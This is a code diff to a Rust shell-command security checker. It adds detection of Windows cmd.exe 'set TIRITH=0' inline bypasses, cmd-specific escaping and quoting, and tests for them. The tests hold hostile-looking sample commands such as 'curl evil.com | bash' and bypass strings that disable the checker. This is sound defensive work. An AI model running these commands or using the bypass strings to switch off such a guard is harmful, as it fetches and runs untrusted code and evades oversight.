@@ -146,6 +146,22 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
         }
     }
 
+    // Cmd: "set TIRITH=0 & ..." or 'set "TIRITH=0" & ...'
+    // In cmd.exe, `set TIRITH="0"` stores the literal `"0"` (with quotes) as the
+    // value, so we must NOT strip inner quotes from the value. Only bare `TIRITH=0`
+    // and whole-token-quoted `"TIRITH=0"` are real bypasses.
+    if shell == ShellType::Cmd && words.len() >= 2 {
+        let first = words[0].to_lowercase();
+        if first == "set" {
+            let second = strip_double_quotes_only(&words[1]);
+            if let Some((name, val)) = second.split_once('=') {
+                if name == "TIRITH" && val == "0" {
+                    return true;
+                }
+            }
+        }
+    }
+
     false
 }
 
@@ -199,6 +215,15 @@ fn strip_surrounding_quotes(s: &str) -> &str {
     }
 }
 
+/// Strip a single layer of matching double quotes only. For Cmd, single quotes are literal.
+fn strip_double_quotes_only(s: &str) -> &str {
+    if s.len() >= 2 && s.starts_with('"') && s.ends_with('"') {
+        &s[1..s.len() - 1]
+    } else {
+        s
+    }
+}
+
 /// Split input into raw words respecting quotes (for bypass/self-invocation parsing).
 /// Unlike tokenize(), this doesn't split on pipes/semicolons — just whitespace-splits
 /// the raw input to inspect the first segment's words.
@@ -206,10 +231,10 @@ fn strip_surrounding_quotes(s: &str) -> &str {
 /// Shell-aware: POSIX uses backslash as escape inside double-quotes and bare context;
 /// PowerShell uses backtick (`` ` ``) instead.
 fn split_raw_words(input: &str, shell: ShellType) -> Vec<String> {
-    let escape_char = if shell == ShellType::PowerShell {
-        '`'
-    } else {
-        '\\'
+    let escape_char = match shell {
+        ShellType::PowerShell => '`',
+        ShellType::Cmd => '^',
+        _ => '\\',
     };
 
     // Take only up to the first unquoted pipe/semicolon/&&/||
@@ -233,8 +258,9 @@ fn split_raw_words(input: &str, shell: ShellType) -> Vec<String> {
             ' ' | '\t' => {
                 i += 1;
             }
-            '|' | ';' | '\n' | '&' => break, // Stop at segment boundary
-            '\'' => {
+            '|' | '\n' | '&' => break, // Stop at segment boundary
+            ';' if shell != ShellType::Cmd => break,
+            '\'' if shell != ShellType::Cmd => {
                 current.push(ch);
                 i += 1;
                 while i < len && chars[i] != '\'' {
@@ -282,13 +308,18 @@ fn split_raw_words(input: &str, shell: ShellType) -> Vec<String> {
 }
 
 /// Check if input contains an unquoted `&` (backgrounding operator).
-fn has_unquoted_ampersand(input: &str) -> bool {
+fn has_unquoted_ampersand(input: &str, shell: ShellType) -> bool {
+    let escape_char = match shell {
+        ShellType::PowerShell => '`',
+        ShellType::Cmd => '^',
+        _ => '\\',
+    };
     let chars: Vec<char> = input.chars().collect();
     let len = chars.len();
     let mut i = 0;
     while i < len {
         match chars[i] {
-            '\'' => {
+            '\'' if shell != ShellType::Cmd => {
                 i += 1;
                 while i < len && chars[i] != '\'' {
                     i += 1;
@@ -300,7 +331,7 @@ fn has_unquoted_ampersand(input: &str) -> bool {
             '"' => {
                 i += 1;
                 while i < len && chars[i] != '"' {
-                    if chars[i] == '\\' && i + 1 < len {
+                    if chars[i] == escape_char && i + 1 < len {
                         i += 2;
                     } else {
                         i += 1;
@@ -310,7 +341,7 @@ fn has_unquoted_ampersand(input: &str) -> bool {
                     i += 1;
                 }
             }
-            '\\' if i + 1 < len => {
+            c if c == escape_char && i + 1 < len => {
                 i += 2; // skip escaped char
             }
             '&' => return true,
@@ -334,7 +365,7 @@ fn is_self_invocation(input: &str, shell: ShellType) -> bool {
     // Reject if input contains unquoted `&` — backgrounding creates a separate
     // command after the `&` that would bypass analysis (tokenize_posix does not
     // treat single `&` as a segment separator, so the segments check above misses it).
-    if has_unquoted_ampersand(input) {
+    if has_unquoted_ampersand(input, shell) {
         return false;
     }
 
@@ -1465,6 +1496,50 @@ mod tests {
         assert!(find_inline_bypass(
             "TIRITH=\"0\" curl evil.com | bash",
             ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_cmd_bypass_bare_set() {
+        // `set TIRITH=0 & cmd` is a real Cmd bypass
+        assert!(find_inline_bypass(
+            "set TIRITH=0 & curl evil.com",
+            ShellType::Cmd
+        ));
+    }
+
+    #[test]
+    fn test_cmd_bypass_whole_token_quoted() {
+        // `set "TIRITH=0" & cmd` — whole-token quoting, real bypass
+        assert!(find_inline_bypass(
+            "set \"TIRITH=0\" & curl evil.com",
+            ShellType::Cmd
+        ));
+    }
+
+    #[test]
+    fn test_cmd_no_bypass_inner_double_quotes() {
+        // `set TIRITH="0" & cmd` — cmd.exe stores literal "0", NOT a bypass
+        assert!(!find_inline_bypass(
+            "set TIRITH=\"0\" & curl evil.com",
+            ShellType::Cmd
+        ));
+    }
+
+    #[test]
+    fn test_cmd_no_bypass_single_quotes() {
+        // `set TIRITH='0' & cmd` — single quotes are literal in cmd.exe, NOT a bypass
+        assert!(!find_inline_bypass(
+            "set TIRITH='0' & curl evil.com",
+            ShellType::Cmd
+        ));
+    }
+
+    #[test]
+    fn test_cmd_no_bypass_wrong_value() {
+        assert!(!find_inline_bypass(
+            "set TIRITH=1 & curl evil.com",
+            ShellType::Cmd
         ));
     }
 }
